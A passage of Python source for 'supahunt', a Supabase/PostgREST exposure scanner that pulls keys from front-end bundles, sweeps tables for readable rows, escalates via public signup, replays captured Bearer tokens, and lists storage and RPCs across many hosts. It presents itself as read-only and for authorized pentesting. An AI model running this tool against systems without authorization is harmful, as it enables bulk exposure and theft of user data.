                title="Public signup - an 'authenticated' session is one "
                      "request away",
                url=f"{base}/auth/v1/signup",
                impact="Policies written for the `authenticated` role assume "
                       "a legitimate customer. Anyone can become one.",
                proof=[f"created: {email}",
                       f"access_token obtained ({len(token)} chars)"],
                note="the whole table sweep is replayed with this session "
                     "below; compare the two"))
            return token, email
        code, msg = pg_error(r)
        self.rep.info(f"signup did not return a session: "
                      f"{r.status} {code} {msg[:90]}")
        return "", email

    def diff_sweeps(self, base, anon_exposed, auth_exposed, label):
        anon_names = {r["table"] for r in anon_exposed}
        new = [r for r in auth_exposed if r["table"] not in anon_names]
        if not new:
            return
        proof = []
        for r in new[:15]:
            cols = [c for c, _ in r["cols"]]
            kinds = {c: classify_name(c, t) for c, t in r["cols"]}
            sens = [c for c in cols if kinds.get(c) in ("secret", "pii")]
            n = r["total"] if r["total"] is not None else "?"
            proof.append(f"{r['table']}: {n} row(s)"
                         + (f"   [{', '.join(sens[:6])}]" if sens else ""))
        self.add(Finding(
            sev=CRIT,
            title=f"{len(new)} further table(s) open up once authenticated",
            url=f"{base}/rest/v1/",
            impact="These are invisible to an anonymous caller and readable "
                   "by any account. Since signup is public, 'any account' "
                   "means anyone.",
            proof=proof,
            chain="POST /auth/v1/signup -> use the access_token as Bearer -> "
                  "read the tables above"))

    # -- 6. the rest of the surface -----------------------------------------

    def storage(self, base, identity):
        r = self.call(f"{base}/storage/v1/bucket", identity,
                      max_read=256 * 1024)
        buckets = r.json()
        if not isinstance(buckets, list) or not buckets:
            code, msg = pg_error(r)
            self.rep.info(f"storage: {r.status} {code} {msg[:80]}")
            return
        names = [b.get("name") for b in buckets if isinstance(b, dict)]
        public = [b.get("name") for b in buckets
                  if isinstance(b, dict) and b.get("public")]
        objects = []
        for name in names[:self.args.max_buckets]:
            rr = self.call(f"{base}/storage/v1/object/list/"
                           f"{urllib.parse.quote(str(name))}",
                           identity, method="POST",
                           body=json.dumps({"prefix": "", "limit": 20}),
                           max_read=256 * 1024)
            items = rr.json()
            if isinstance(items, list) and items:
                for it in items[:5]:
                    if isinstance(it, dict) and it.get("name"):
                        objects.append(f"{name}/{it['name']}")
        if objects:
            self.add(Finding(
                sev=HIGH,
                title=f"Storage objects listable ({len(objects)} shown)",
                url=f"{base}/storage/v1/",
                impact="Object names alone leak business data, and anything "
                       "in a public bucket is downloadable by URL.",
                proof=objects[:20]
                      + ([f"public buckets: {', '.join(map(str, public))}"]
                         if public else []),
                poc=self.curl_for(f"{base}/storage/v1/bucket", identity)))
        elif names:
            self.add(Finding(
                sev=LOW, title=f"{len(names)} storage bucket(s) enumerated",
                url=f"{base}/storage/v1/bucket",
                impact="Names only; the objects were not listable.",
                proof=[str(n) for n in names[:20]]))

    def rpcs(self, base, rpcs):
        if not rpcs:
            return
        risky = [f for f in rpcs
                 if re.search(r"(?i)(admin|delete|drop|reset|grant|set_|"
                              r"update|create|insert|invite|token|secret|"
                              r"password|export|import|exec|run|sql)", f)]
        self.write(base, "rpc.txt", "\n".join(sorted(rpcs)))
        self.add(Finding(
            sev=MED if risky else INFO,
            title=f"{len(rpcs)} RPC function(s) exposed"
                  + (f", {len(risky)} with a risky name" if risky else ""),
            url=f"{base}/rest/v1/rpc/",
            impact="Postgres functions callable over HTTP. A SECURITY "
                   "DEFINER function runs as its owner and ignores RLS by "
                   "design; one written with dynamic SQL is an injection "
                   "point.",
            proof=(risky or sorted(rpcs))[:20],
            note="NOT called - a function does whatever it wants. Full list "
                 "in rpc.txt",
            poc="POST /rest/v1/rpc/<name> with {} - review each by hand"))

    def graphql(self, base, identity):
        r = self.call(f"{base}/graphql/v1", identity, method="POST",
                      body=json.dumps({"query": "{__typename}"}),
                      max_read=64 * 1024)
        obj = r.json()
        if isinstance(obj, dict) and isinstance(obj.get("data"), dict) and \
                obj["data"].get("__typename"):
            self.add(Finding(
                sev=LOW,
                title="pg_graphql exposed on /graphql/v1",
                url=f"{base}/graphql/v1",
                impact="The same schema, through a second door. Same RLS, "
                       "but a different surface - and introspection is "
                       "often left on here.",
                proof=[f"__typename = {obj['data']['__typename']}"],
                chain=f"gqlhunt.py -u {base}/graphql/v1 --no-discover "
                      f"-H 'apikey: <key>'"))

    def check_write(self, base, identity, results):
        """
        Off by default, and deliberately does NOT conclude.

        The probe is an INSERT of an empty object. What comes back tells you
        something, but the order in which Postgres evaluates constraints and
        the RLS WITH CHECK clause is version dependent, so this prints the
        observed code and its meaning and leaves the judgement to you. If the
        table has only nullable columns with defaults, an empty INSERT CAN
        create a row - that is why this is opt-in.
        """
        exposed = [r for r in results if r["rows"] is not None][:5]
        rows = []
        for res in exposed:
            url = f"{base}/rest/v1/{urllib.parse.quote(res['table'])}"
            r = self.call(url, identity, method="POST", body="{}",
                          extra={"Prefer": "return=minimal"},
                          max_read=32 * 1024)
            code, msg = pg_error(r)
            rows.append(f"{res['table']}: HTTP {r.status} {code} "
                        f"{ERR_MEANING.get(code, msg[:70])}")
        if rows:
            self.add(Finding(
                sev=INFO,
                title="Write probe results (interpret these yourself)",
                url=f"{base}/rest/v1/",
                impact="42501 means the policy refused the statement. A "
                       "constraint code (23502/23505/23503) means the "
                       "statement was evaluated, which points at a missing "
                       "INSERT policy - confirm by hand before reporting.",
                proof=rows,
                note="--check-write was given; an empty INSERT can create a "
                     "row on a table whose columns are all nullable"))

    # -- orchestration ------------------------------------------------------

    def hunt(self, target):
        started = time.time()
        before = len(self.findings)
        self.rep.banner(f"Hunting {target}")
        try:
            base, keys = self.discover(target)
            if not base:
                self.rep.test(f"{target}: no Supabase project found")
                return
            self.rep.info(f"project: {base}")

            if self.args.key:
                k = classify_key(self.args.key, source="--key")
                if k:
                    keys.insert(0, k)
            if self.captured and self.captured.key:
                keys.insert(0, self.captured.key)
            if not keys:
                self.add(Finding(
                    sev=INFO, title="Supabase project found, but no key",
                    url=base,
                    impact="Without a publishable key nothing below can be "
                           "measured. The key is in the front-end bundle, "
                           "or pass one with --key.",
                    proof=[f"project: {base}"]))
                return

            seen, uniq = set(), []
            for k in keys:
                if k.value not in seen:
                    seen.add(k.value)
                    uniq.append(k)
            self.report_keys(base, uniq)

            # work with the least privileged key that actually functions
            usable = sorted(uniq, key=lambda k: (0 if k.kind in
                                                 ("anon", "publishable")
                                                 else 1))
            # the baseline must be the key ALONE: attaching the captured
            # user's JWT here would make the later diff meaningless
            identity = Identity(name=usable[0].kind, key=usable[0],
                                headers=(self.captured.headers
                                         if self.captured else {}))
            for k in uniq:
                if k.bypasses_rls:
                    self.confirm_secret(base, Identity(name=k.kind, key=k))

            spec = self.openapi(base, identity)
            if not spec:
                self.add(Finding(
                    sev=INFO, title="Schema not readable",
                    url=f"{base}/rest/v1/",
                    impact="The OpenAPI document was refused, so the table "
                           "list is unknown. The services below were still "
                           "checked.",
                    proof=["GET /rest/v1/ did not return a schema"]))
                tables, rpc = {}, []
            else:
                self.write(base, "openapi.json",
                           json.dumps(spec, indent=1)[:4000000])
                tables, rpc = self.split_openapi(spec)
                self.add(Finding(
                    sev=INFO,
                    title=f"Schema recovered: {len(tables)} table(s)/view(s), "
                          f"{len(rpc)} function(s)",
                    url=f"{base}/rest/v1/",
                    impact="PostgREST publishes the OpenAPI document of the "
                           "exposed schema - the full target list, for free.",
                    proof=sorted(tables)[:20]))

            anon_exposed = []
            if tables:
                res = self.sweep(base, identity, tables, identity.name)
                anon_exposed = self.report_sweep(base, identity, res,
                                                 identity.name)
                if self.args.check_write:
                    self.check_write(base, identity, res)

            if self.args.signup and tables:
                token, email = self.signup(base, identity)
                if token:
                    auth_id = Identity(name="signed-up", key=identity.key,
                                       bearer=token,
                                       headers=identity.headers)
                    res2 = self.sweep(base, auth_id, tables, "signed-up")
                    auth_exposed = self.report_sweep(base, auth_id, res2,
                                                     "signed-up")
                    self.diff_sweeps(base, anon_exposed, auth_exposed,
                                     "signed-up")

            if self.captured and self.captured.bearer and tables:
                cap = Identity(name="captured", key=identity.key,
                               bearer=self.captured.bearer,
                               headers=self.captured.headers)
                res3 = self.sweep(base, cap, tables, "captured")
                cap_exposed = self.report_sweep(base, cap, res3, "captured")
                self.diff_sweeps(base, anon_exposed, cap_exposed, "captured")

            if not self.args.no_storage:
                self.storage(base, identity)
            self.rpcs(base, rpc)
            if not self.args.no_graphql:
                self.graphql(base, identity)

        except Exception as e:
            self.rep.error(f"{target}: {type(e).__name__}: {e}")
            if self.args.verbose >= 2:
                import traceback
                traceback.print_exc()
        finally:
            got = self.findings[before:]
            self.rep.line(f"\n--- {target}: {len(got)} finding(s) in "
                          f"{time.time() - started:.1f}s ---")
            if self.status:
                self.status.target_done()


def shell_quote(s):
    return "'" + str(s).replace("'", "'\"'\"'") + "'"


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------

BANNER = r"""
  supahunt - Supabase / PostgREST exposure extractor
  read-only; authorized testing only
"""

EPILOG = """
how it proves impact without dumping anything
  Prefer: count=exact with Range: 0-0 returns the EXACT number of rows in the
  Content-Range header while retrieving a single record. "the users table has
  48231 rows readable anonymously" is a report; aspirating the table is a
  privacy incident and gets reports rejected.

the escalation nobody runs
  Projects routinely lock down the `anon` role and leave `authenticated` wide
  open - but /auth/v1/signup is public. --signup creates one account, replays
  the whole sweep with it, and prints the difference.

keys
  A legacy JWT decodes to its role. service_role and sb_secret_* bypass RLS
  entirely and are critical on sight; they are tested with a neutral
  User-Agent because Supabase refuses them when the UA looks like a browser.

safety
  Read only. No INSERT/UPDATE/DELETE. RPC functions are listed, never called.
  --check-write is opt-in and reports the error code it observed without
  concluding, because an empty INSERT can create a row on a permissive table.

examples
  supahunt.py -u https://app.example.com
  supahunt.py -u https://abcdefghijklmnopqrst.supabase.co --key eyJhbGci...
  supahunt.py -u https://app.example.com --signup -v 1
  supahunt.py -r burp-authenticated.txt -o client.log
  supahunt.py -l hosts.txt -t 8 -d 0.2 --status-interval 15
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="supahunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", dest="verbose", type=int, nargs="?", const=1,
                   default=0, choices=[0, 1, 2],
                   help="verbosity: 0 = only findings (default), 1 = every "
                        "test performed, 2 = debug (every request, response "
                        "status/size/timing)")
    p.add_argument("-u", dest="url", help="single URL to test (the app, or "
                                          "the Supabase project itself)")
    p.add_argument("-l", dest="list", help="file containing a list of URLs")
    p.add_argument("-r", "--request", metavar="FILE",
                   help="raw HTTP request file (Burp/ZAP export): the project "
                        "URL, the apikey header and - very often - a logged "
                        "in user's Bearer JWT are taken from it and replayed "
                        "as a third identity")
    p.add_argument("--force-ssl", action="store_true",
                   help="force https for a -r request (default: inferred "
                        "from Origin/Referer, else http)")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0,
                   metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0, metavar="SEC",
                   help="minimum gap between requests, enforced globally "
                        "across all threads")
    p.add_argument("-H", "--header", action="append", default=[],
                   metavar="HEADER",
                   help="extra header 'Name: value' (repeatable) - also how "
                        "to set a Cookie or override the User-Agent")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("-o", "--output", default="supahunt.log", metavar="FILE",
                   help="log file for the results (default supahunt.log); "
                        "empty string disables it")
    p.add_argument("--loot", default="supaloot", metavar="DIR",
                   help="directory for the extracted material - openapi.json, "
                        "tables-*.txt, rpc.txt, pocs.txt (default supaloot)")
    p.add_argument("--key", metavar="KEY",
                   help="use this Supabase key (anon / publishable / "
                        "service_role / secret) instead of, or in addition "
                        "to, the ones found in the bundles")
    p.add_argument("--signup", action="store_true",
                   help="create ONE throwaway account via /auth/v1/signup and "
                        "replay the whole sweep as an authenticated user. Off "
                        "by default because it creates state on the target.")
    p.add_argument("--signup-email", metavar="EMAIL",
                   help="address to use for --signup (default: a random "
                        "@example.com)")
    p.add_argument("--check-write", action="store_true",
                   help="probe whether INSERT is refused by policy. Off by "
                        "default: on a table whose columns are all nullable "
                        "this CAN create a row. Reports the observed error "
                        "code without concluding.")
    p.add_argument("--sample", type=int, default=1, metavar="N",
                   help="rows retrieved per exposed table (default 1) - the "
                        "count is the impact, the row is only the proof")
    p.add_argument("--max-tables", type=int, default=120, metavar="N",
                   help="tables probed per project (default 120)")
    p.add_argument("--max-buckets", type=int, default=20, metavar="N",
                   help="storage buckets listed (default 20)")
    p.add_argument("--max-scripts", type=int, default=15, metavar="N",
                   help="JavaScript bundles fetched while hunting for the "
                        "project URL and key (default 15)")
    p.add_argument("--timeout", type=float, default=15.0,
                   help="request timeout (s, default 15)")
    p.add_argument("--no-storage", action="store_true",
                   help="skip the storage service")
    p.add_argument("--no-graphql", action="store_true",
                   help="skip the pg_graphql check")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    return p


def load_urls(path):
    out = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
    except Exception as e:
        print(f"cannot read {path}: {e}", file=sys.stderr)
        sys.exit(2)
    return out


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.no_color or not sys.stdout.isatty():
        Colors.disable()
    rep = Reporter(args.verbose, args.output or None)

    captured = None
    target_from_request = None
    if args.request:
        try:
            target_from_request, captured = identity_from_request(
                args.request, args.force_ssl)
        except Exception as e:
            print(f"-r: {e}", file=sys.stderr)
            sys.exit(2)

    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        targets += load_urls(args.list)
    if not targets and target_from_request:
        targets.append(target_from_request)
    if not targets:
        print("nothing to do: give -u, -l or -r", file=sys.stderr)
        sys.exit(2)

    http = Http(timeout=args.timeout, proxy=args.proxy, headers=args.header,
                delay=args.delay, rep=rep)
    status = Status(rep, len(targets), args.status_interval,
                    enabled=bool(args.list))
    hunter = SupaHunter(http, rep, args, status)
    hunter.captured = captured

    print(f"{Colors.CYAN}{BANNER}{Colors.RESET}")
    print(f"  targets {Colors.BOLD}{len(targets)}{Colors.RESET}   "
          f"threads {args.threads}   timeout {args.timeout:.0f}s"
          + (f"   delay {args.delay}s" if args.delay else "")
          + ("   signup ON" if args.signup else "")
          + ("   write probe ON" if args.check_write else "")
          + (f"   log -> {args.output}" if args.output else "")
          + (f"   loot -> {args.loot}" if args.loot else ""))
    print()
    rep.log_only(f"\n{'=' * 72}\nsupahunt {VERSION}  "
                 f"{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                 f"command: {' '.join(sys.argv)}\n{'=' * 72}")

    t0 = time.time()
    status.start_thread()
    if len(targets) == 1 or args.threads <= 1:
        for t in targets:
            hunter.hunt(t)
    else:
        with concurrent.futures.ThreadPoolExecutor(
                max_workers=args.threads) as ex:
            list(ex.map(hunter.hunt, targets))
    status.stop()

    C = Colors
    rep.line(f"\n{C.BOLD}--- summary ---{C.RESET}")
    rep.line(f"targets   : {len(targets)}")
    rep.line(f"requests  : {http.count}")
    rep.line(f"duration  : {time.time() - t0:.1f}s")
    counts = {}
    for f in hunter.findings:
        counts[f.sev] = counts.get(f.sev, 0) + 1
    if not counts:
        rep.line("findings  : none")
    for sev in (CRIT, HIGH, MED, LOW, INFO):
        if counts.get(sev):
            rep.line(f"  {sev_paint(sev)}{sev:<10}{C.RESET} {counts[sev]}")
    if args.output:
        rep.line(f"\nlog written to {args.output}")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        sys.exit(130)
